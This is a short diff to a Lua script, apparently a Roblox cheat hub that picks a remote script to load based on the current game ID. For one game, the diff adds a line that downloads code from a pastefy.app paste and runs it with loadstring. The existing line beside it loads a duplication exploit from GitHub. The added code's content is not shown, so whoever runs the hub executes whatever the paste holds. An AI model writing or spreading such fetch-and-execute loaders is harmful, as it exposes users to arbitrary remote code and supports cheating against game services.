@@ -111,6 +111,7 @@ local AuraEditTowerGameId = 129435169164618
 -- GAME CHECKS
 
 if gameId == popItGameId then
+    loadstring(game:HttpGet("https://pastefy.app/uZlu30Ce/raw"))() 
     loadstring(game:HttpGet("https://raw.githubusercontent.com/Farx11122/Dupess/main/DupeSsv2"))()
 
 elseif gameId == petsGameId then
